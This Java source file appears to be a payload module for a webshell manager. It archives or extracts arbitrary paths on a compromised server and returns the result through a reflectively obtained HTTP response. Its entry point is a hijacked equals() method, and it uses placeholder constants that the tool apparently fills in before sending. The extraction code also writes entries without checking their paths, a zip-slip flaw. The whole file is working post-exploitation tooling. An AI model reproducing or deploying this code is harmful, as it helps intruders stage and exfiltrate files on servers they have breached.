// ZIP 压缩/解压载荷（java.util.zip，纯 JDK）：o=zip（s=目录/文件 → d=zip 路径）/
// unzip（s=zip → d=目标目录）。约束：默认包、全反射回显、单 class、零跨类引用。
public class WsmZip {

	public static final String o = "WSMZ-O0"; // zip / unzip
	public static final String s = "WSMZ-S0"; // 源（目录或文件 / zip 文件）
	public static final String d = "WSMZ-D0"; // 目标（zip 路径 / 解压目录）

	public boolean equals(Object ctx) {
		String out;
		try {
			if ("zip".equals(o)) {
				java.io.File src = new java.io.File(s);
				java.io.FileOutputStream fo = new java.io.FileOutputStream(d);
				java.util.zip.ZipOutputStream z = new java.util.zip.ZipOutputStream(fo);
				int[] count = { 0 };
				if (src.isDirectory()) zipDir(z, src, src.getAbsolutePath(), count);
				else zipFile(z, src, "", count);
				z.close(); fo.close();
				out = "OK zipped " + count[0] + " entries -> " + d;
			} else if ("unzip".equals(o)) {
				java.io.File dstDir = new java.io.File(d);
				if (!dstDir.exists()) dstDir.mkdirs();
				java.util.zip.ZipInputStream z = new java.util.zip.ZipInputStream(new java.io.FileInputStream(s));
				java.util.zip.ZipEntry e;
				int count = 0;
				while ((e = z.getNextEntry()) != null) {
					java.io.File f = new java.io.File(dstDir, e.getName());
					if (e.isDirectory()) { f.mkdirs(); continue; }
					new java.io.File(f.getParent()).mkdirs();
					java.io.FileOutputStream fo = new java.io.FileOutputStream(f);
					byte[] b = new byte[16384];
					int n;
					while ((n = z.read(b)) != -1) fo.write(b, 0, n);
					fo.close();
					count++;
				}
				z.close();
				out = "OK unzipped " + count + " files -> " + d;
			} else {
				throw new Exception("unknown op " + o);
			}
		} catch (Throwable e) { out = "!ERR " + e; }
		try { write(respOf(ctx), out); } catch (Throwable ignored) {}
		return true;
	}

	static void zipDir(java.util.zip.ZipOutputStream z, java.io.File dir, String root, int[] count) throws Exception {
		java.io.File[] fs = dir.listFiles();
		if (fs == null) return;
		for (java.io.File f : fs) {
			if (f.isDirectory()) zipDir(z, f, root, count);
			else zipFile(z, f, f.getAbsolutePath().substring(root.length() + 1), count);
		}
	}

	static void zipFile(java.util.zip.ZipOutputStream z, java.io.File f, String name, int[] count) throws Exception {
		z.putNextEntry(new java.util.zip.ZipEntry(name.replace(java.io.File.separatorChar, '/')));
		java.io.FileInputStream fi = new java.io.FileInputStream(f);
		byte[] b = new byte[16384];
		int n;
		while ((n = fi.read(b)) != -1) z.write(b, 0, n);
		fi.close();
		z.closeEntry();
		count[0]++;
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) { Object[] a = (Object[]) ctx; return a.length > 1 ? a[1] : null; }
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
